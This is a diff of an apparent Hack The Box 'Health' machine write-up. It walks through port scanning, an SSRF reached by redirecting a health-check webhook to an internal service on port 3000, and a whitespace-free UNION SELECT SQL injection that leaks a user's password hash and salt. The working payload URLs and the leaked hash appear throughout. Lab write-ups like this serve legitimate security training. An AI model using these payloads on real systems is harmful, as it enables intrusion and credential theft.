@@ -4,9 +4,11 @@
 ![image](https://user-images.githubusercontent.com/105310322/194118518-d3bfb867-a11d-4800-80b0-a4fcc96a6e7e.png)
 
 
-### Tools:
+### Tools: Redirect.py, Burpsuite, Hashcat, 
 
-### Vulnerabilities:
+### Vulnerabilities: URL Redirect, SQLI Union Select: WAF bypass, Salted Hash,
+
+Nmap reveals ssh, a webpage and a filtered port 3000.
 
 ```console
 └─$ nmap -A -p- -T4 -Pn 10.129.61.202
@@ -31,47 +33,13 @@ Nmap done: 1 IP address (1 host up) scanned in 43.07 seconds
 
 ```
 
-```console
-└─$ feroxbuster -u http://10.129.61.202/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
-200      GET      205l      620w     7353c http://10.129.61.202/
-301      GET        9l       28w      311c http://10.129.61.202/js => http://10.129.61.202/js/
-403      GET        9l       28w      278c http://10.129.61.202/.php
-301      GET        9l       28w      312c http://10.129.61.202/css => http://10.129.61.202/css/
-403      GET        9l       28w      278c http://10.129.61.202/.html
-301      GET        9l       28w      319c http://10.129.61.202/javascript => http://10.129.61.202/javascript/
-200      GET      205l      620w     7363c http://10.129.61.202/index.php
-301      GET        9l       28w      326c http://10.129.61.202/javascript/jquery => http://10.129.61.202/javascript/jquery/
-403      GET        9l       28w      278c http://10.129.61.202/javascript/.php
-403      GET        9l       28w      278c http://10.129.61.202/javascript/.html
-200      GET    10253l    40948w   268026c http://10.129.61.202/javascript/jquery/jquery
-301      GET        9l       28w      325c http://10.129.61.202/javascript/async => http://10.129.61.202/javascript/async/
-200      GET     1058l     3007w    32659c http://10.129.61.202/javascript/async/async
-200      GET        2l        3w       24c http://10.129.61.202/robots.txt
-403      GET        9l       28w      278c http://10.129.61.202/server-status
+The webpage is a health check site for checking any webpage. I tried a few things but the way to go was to access the port 3000 site that was running off their local host. Trying to check their localhost:3000 returns an error that it is not allowed.
 
-```
-
-```
-GET / HTTP/1.1
-Host: 10.129.61.202
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Connection: close
-Cookie: XSRF-TOKEN=eyJpdiI6ImVlY1NIeHV0YS9VeHArclZ4MkdPa2c9PSIsInZhbHVlIjoiOHlIaURGdXlOd1h2VUlwTERmbmxEVDFBVElnQmozUDlnbVVQR0lsWkJwUXhLeUV1aWd0ejVqUDB0T2hLRW9JMkV3UHFhd2VYdmNBcUxLTzRQTTAyZW0zaUVOc0FxdTBQTEk1YkMybnlDcmZEVDJCVTVFWVJ0MGVLRHRNSVB0bXciLCJtYWMiOiIwZDRjZGQ0NzE5MGU4MTIwNDE1ZTg5NDU4MzY5ZWYzYWI1YmZhZDAxNDEyYzAxNGUwYWQxZTY4YWZkMzUwYjBlIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImpuYkNzcjhobjg5bGkzZFl1blppZEE9PSIsInZhbHVlIjoiV3dKaFFYMS83U0tNVXM4OVJtMitvWkNnaW03bDByNXM1Q2puYksvVWRCRnhrcHRmVllrQlh4V0RJWVEvOTNoTXlTWmRxa3ZLTFU4TStqNUc4ZFZubUtMNGUwUmlyRytmeWo2cjZaMllKaG9WZVZWMHpIc0FmZFB0VTBPZVYwWFciLCJtYWMiOiI1Nzc2YjQ5MGY0NGNjMDA1ZjhlMDgzZjliNjdlNTQzMGFiMzc2NzI2ZGViODAxYmFiZDAzZjA3YmYxNDViMDBhIiwidGFnIjoiIn0%3D
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
-```
-XSRF-TOken
-```{"iv":"ucvu2C+yBwUzu3pTExzryA==","value":"XZQ17kJdKQqzMVeZ/28PNwTUD2H08xaBkbXxV/xVeTH0jlGrI6DVmCOhrjmJaXB87S3tazk6kU4TDed++6fxkp5NDZvqSQgUv6utoixosdGtrt0iBJKGdsn2mkWNxWfB","mac":"ed4747b3a49bfd7d46bdceb29faa0ebc08c686694930d124f9709cff7359d246","tag":""}7```
-
-laravel_session
-```{"iv":"sTkMOqsH1wwVUXITbmkkYg==","value":"8SodhShEuApHd13EKoRQsoIgAb+Zu9ervZsg7WoDkkVac1wWFQrf4RWZEb7e+bHf0CQ45wgvzRKDVuxjEaplWzwqvEskzogZxe3YzZ1EeSebV4m79yB5VjnEyI5ITvQ3","mac":"64e43dd75e10a0c2d697555f80af9e84722e88754369e034002666692180ac03","tag":""}7```
-
+So to get around this problem we need to redirect to the url through health.htb. The link below is for a simple python script to redirect.
 
 ```https://gist.github.com/shreddd/b7991ab491384e3c3331```
 
+After setting up the redirect dont forget to set up the nc listner to catch the page.
 
 ```console
 └─$ python2 redirect.py --port 80 --ip 10.10.16.19 http://127.0.0.1:3000
@@ -79,9 +47,13 @@ serving at port 80
 10.129.61.202 - - [05/Oct/2022 14:22:23] "GET / HTTP/1.0" 301 -
 ```
 
+Next we input the following into the fields on the webpage.
+
+```
 http://10.10.16.19:1234
 http://10.10.16.19
 *5/ * * * *
+```
 
 The file comes out in extended format so we have to format it so we can access the webpage.
 
@@ -250,18 +222,39 @@ After formatting it we get an html that looks much nicer.
 </html>
 ```
 
-The PoC gives us a template for how we can make our union select payload.
+Now if we drag and drop the html file into our browser we can access the static page.
+
+
+
+
+
+
+
+
+
 
 https://www.exploit-db.com/exploits/35238
 
+The PoC gives us a template for how we can make our union select payload. By formatting the PoC for our uses we can see that it takes in 27 slots, in the 3rd slot we can put our tables that we want to leak.
+
+By formating the PoC we can more quickly get the result we are looking for since we do not have to manually input everything.
+
+Fire up burpsuite with the payload URL and monitored URL to speed up your trial and error process.
+
+Note: From hacktricks this is a WAF bypass and no whitespace is needed in the URL payload. 
+
+```https://book.hacktricks.xyz/pentesting-web/sql-injection```
+
 
 ```
-└─$ python2.7 redirect.py --port 80 --ip 10.10.16.19 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
-
+└─$ python2.7 redirect.py --port 80 --ip 10.10.16.19 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,(select/**/passwd/**/from/**/user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
 serving at port 80
 10.129.61.202 - - [05/Oct/2022 15:18:37] "GET / HTTP/1.0" 301 -
 ```
-66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37
+
+The following payload gives us back a hashed password.
+
+```66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37```
 
 ```console
 └─$ nc -lvnp 1234
@@ -276,11 +269,12 @@ Content-Length: 846
 {"webhookUrl":"http:\/\/10.10.16.19:1234","monitoredUrl":"http:\/\/10.10.16.19","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/1\"}],\"ok\":true}","message":"HTTP\/1.0 301 Moved Permanently","headers":{"Server":"SimpleHTTP\/0.6 Python\/2.7.18","Date":"Wed, 05 Oct 2022 21:09:25 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,1,(select\/**\/passwd\/**\/from\/**\/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"264"}}
 
 ```
+And this payload gives us the salt for the hash.
 
-sO3XIbeW14
+```sO3XIbeW14```
 
 ```console
-└─$ python2.7 redirect.py --port 80 --ip 10.10.16.19 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
+└─$ python2.7 redirect.py --port 80 --ip 10.10.16.19 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,(select/**/salt/**/from/**/user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
 serving at port 80
 10.129.61.202 - - [05/Oct/2022 15:18:37] "GET / HTTP/1.0" 301 -
 ```
